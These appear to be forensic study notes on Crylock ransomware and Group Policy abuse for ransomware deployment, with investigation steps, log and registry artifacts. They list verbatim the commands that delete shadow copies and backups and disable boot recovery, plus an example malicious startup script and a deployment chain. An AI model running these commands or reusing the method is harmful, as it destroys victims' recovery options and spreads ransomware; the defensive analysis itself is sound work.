|`"vssadmin delete shadows /all /quiet"`|Deletes all Volume Shadow Copies (snapshots). Prevents users from restoring to previous system states.|
|`"wbadmin DELETE SYSTEMSTATEBACKUP -keepVersions:0"`|Deletes system state backups created with Windows Backup (`wbadmin`).|
|`"wbadmin DELETE BACKUP -keepVersions:0"`|Deletes all backup versions.|
|`"wmic SHADOWCOPY DELETE"`|Another way to delete shadow copies using WMIC (Windows Management Instrumentation Command-line).|
|`"bcdedit /set {default} recoveryenabled No"`|Disables Windows automatic recovery on next boot.|
|`"bcdedit /set {default} bootstatuspolicy ignoreallfailures"`|Configures Windows to **ignore startup failures**, preventing automatic repair tools from activating.|

---

### **Why This Matters:**

- **Shadow Copies** are often the last hope for restoring encrypted data without paying ransom.
    
- **System State Backups** would allow recovery of registry, Active Directory, and system files.
    
- **Disabling Recovery** ensures that victims **cannot easily fix boot errors** and are forced to deal with the ransomware’s demands.
    

**➔ In short: Crylock makes sure victims are trapped with no simple way to recover.**

---

## **3. Encryption Mechanics**

### **How Crylock Encrypts Files:**

|Layer|Algorithm Used|Purpose|
|---|---|---|
|First|**Custom symmetric cipher**|Encrypts file content quickly. Symmetric encryption is fast, ideal for large data sets.|
|Second|**RSA (Asymmetric)**|Encrypts the symmetric key used earlier. RSA uses public/private keys, making it impractical to recover data without the attacker’s private key.|

**➔ This hybrid encryption approach** (symmetric for speed + asymmetric for security) is **standard in modern ransomware**.

# Deep Dive: Group Policy Abuse for Ransomware Deployment

---

## **1. What is Group Policy?**

- **Group Policy Objects (GPOs)** are administrative tools in Active Directory (AD) that allow centralized management of:
    
    - Security settings
        
    - Software installation
        
    - Script execution
        
    - System configurations
        

**➔ GPOs apply settings across many machines** — which makes them powerful **both for admins and for attackers**.

---

## **2. How Attackers Abuse Group Policy**

When threat actors **compromise the domain controller** (DC), they often:

- **Create new GPOs**.
    
- **Modify existing GPOs**.
    
- **Link GPOs** to organizational units (OUs) containing large numbers of computers.
    

**Tactics include:**

|Technique|Purpose|
|---|---|
|**Startup Scripts**|Execute ransomware when the system boots.|
|**Scheduled Tasks via GPO**|Create recurring tasks to launch ransomware payloads.|
|**Software Installation Policies**|Push malicious executables as “approved software.”|
|**Registry Modifications**|Force malicious autoruns through registry changes.|
|**Logon Scripts**|Run ransomware when users log in.|

---

## **3. Specific Example: LockBit Ransomware Self-Distribution**

- **LockBit** (especially newer versions like LockBit 2.0 and LockBit 3.0) **has built-in capabilities** to **create or manipulate GPOs** automatically **after gaining domain admin privileges**.
    
- This automates mass ransomware deployment without needing manual lateral movement.
    

---

## **4. Forensic Investigation Approach**

When investigating **GPO-based ransomware deployment**, follow these steps:

---

### **Step 1: Start from the Ransom Note**

- **Locate the first dropped ransom note** (e.g., `README.txt`, `HOW_TO_DECRYPT.hta`).
    
- **Check file creation time** (MFT timestamps, folder properties).
    
- **Work backwards in logs** to find what changes happened shortly before the ransom note appeared.
    

---

### **Step 2: Identify Suspicious GPO Creation/Modification**

Look for signs like:

- **New GPOs** with suspicious names or configurations.
    
- **GPOs that suddenly push executables**.
    
- **Script policies** (Startup/Logon Scripts) pointing to **non-standard paths** or **payloads**.
    

---

### **Step 3: Specific Artifacts and Logs to Check**

|Artifact|What to Look For|
|---|---|
|**Event Logs: System.evtx (Event ID 4739)**|Modification of GPOs.|
|**Event Logs: Directory Service (Event ID 5136)**|Changes to Active Directory objects (including GPOs).|
|**SYSVOL Folder**|Ransomware payloads copied into `\\domain.local\SYSVOL\domain.local\scripts\`.|
|**GPMC (Group Policy Management Console)**|Audit linked GPOs manually if live system access is possible.|
|**`gpt.ini` Files**|Changes in GPO settings under SYSVOL.|
|**Startup/Logon Scripts Locations**|Added scripts in GPO scripts sections.|

---

### **Step 4: Registry Locations Affected by GPOs**

After a GPO is applied, on the victim machine:

- **Startup scripts** are stored in:
    
    pgsql
    
    CopyEdit
    
    `HKLM\Software\Microsoft\Windows\CurrentVersion\Group Policy\Scripts\Startup`
    
- **Logon scripts** are stored in:
    
    pgsql
    
    CopyEdit
    
    `HKCU\Software\Microsoft\Windows\CurrentVersion\Group Policy\Scripts\Logon`
    

**➔ Check if new script entries correspond to ransomware payloads.**

---

## **5. Practical Example of Suspicious GPO Indicators**

- GPO Name: **"Updates for Network Security"**
    
- Startup Script Path:
    
    pgsql
    
    CopyEdit
    
    `\\domain.local\SYSVOL\domain.local\scripts\updater.exe`
    
- Script:
    
    pgsql
    
    CopyEdit
    
    `cmd.exe /c \\domain.local\SYSVOL\domain.local\scripts\payload.exe`
    

**➔ SYSVOL is being abused to distribute the ransomware binary enterprise-wide!**

---

## **6. Enterprise-Wide Ransomware Deployment Chain**

|Stage|Action|
|---|---|
|1. Initial Compromise|Attackers gain domain admin privileges.|
|2. GPO Creation|Create a new GPO with startup or logon scripts pointing to ransomware.|
|3. GPO Linking|Link the malicious GPO to target OUs (e.g., Workstations, Servers).|
|4. Ransomware Deployment|Scripts are pushed during startup or user login.|
|5. Encryption|Mass file encryption begins almost simultaneously across the enterprise.|
